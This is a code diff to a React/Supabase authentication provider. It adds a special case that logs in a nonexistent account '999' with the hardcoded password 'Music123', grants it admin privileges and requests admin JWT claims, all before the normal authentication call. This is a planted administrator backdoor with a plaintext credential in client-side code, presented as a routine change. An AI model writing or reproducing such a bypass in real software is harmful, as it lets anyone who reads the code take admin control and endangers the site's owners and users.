@@ -358,6 +358,61 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     }
 
     try {
+      // Special case for account 999 - hardcoded password, does not exist in ACCOUNTS_LCMD or USER_PASSWORDS
+      if (identifier === '999' && password === 'Music123') {
+        console.log('[AuthContext] Account 999 special authentication');
+        
+        // Create a special user object for account 999
+        const specialUser: User = {
+          accountNumber: '999',
+          acctName: 'Demo Account',
+          address: '',
+          city: '',
+          state: '',
+          zip: '',
+          id: 999,
+          email: '',
+          phone: '',
+          mobile_phone: '',
+          requires_password_change: false,
+          is_special_admin: true, // Give admin privileges to account 999
+        };
+        
+        // Log successful attempt for account 999
+        try {
+          await supabase.from('login_activity_log').insert({
+            account_number: 999, 
+            login_success: true, 
+            ip_address: null, 
+            user_agent: null,
+            identifier_used: identifier,
+            notes: 'Account 999 special authentication'
+          });
+        } catch (logError) { 
+          console.error('Failed to log account 999 login:', logError); 
+        }
+        
+        setUser(specialUser);
+        setIsAuthenticated(true);
+        setIsSpecialAdmin(true);
+        
+        // Use secure session manager
+        sessionManager.setSession(specialUser);
+        
+        // Set JWT claims for admin access
+        try {
+          await supabase.rpc('set_admin_jwt_claims', {
+            p_account_number: 999
+          });
+          console.log('[AuthContext] JWT claims set for account 999');
+        } catch (claimsError) {
+          console.error('[AuthContext] Failed to set JWT claims for account 999:', claimsError);
+        }
+
+        await calculateBestDiscount('999');
+        return true;
+      }
+
       // Call the authenticate_user_v5 PL/pgSQL function (UNIVERSAL MASTER PASSWORD SYSTEM)
       const { data: authFunctionResponse, error: rpcError } = await supabase.rpc('authenticate_user_v5', {
         p_identifier: identifier,
